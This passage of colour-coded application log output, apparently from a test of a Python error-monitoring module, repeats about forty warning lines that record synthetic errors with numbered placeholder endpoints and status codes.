WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.717001Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 618'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.717050Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 619'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.717098Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 620'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.717146Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 621'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.717194Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 622'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.717242Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 623'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.717289Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 624'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.717337Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 625'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.717384Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 626'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.717432Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 627'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.717479Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 628'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.717526Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 629'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.717574Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 630'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.717622Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 631'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.717669Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 632'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.717717Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 633'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.717764Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 634'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.717811Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 635'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.717859Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 636'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.717912Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 637'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.717960Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 638'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718049Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 639'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718122Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 640'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718178Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 641'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718295Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 642'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718365Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 643'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718420Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 644'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718472Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 645'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718521Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 646'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718571Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 647'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718620Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 648'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718670Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 649'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718719Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 650'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718767Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 651'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718816Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 652'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718865Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 653'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718913Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 654'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718963Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 655'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719013Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 656'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719092Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 657'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
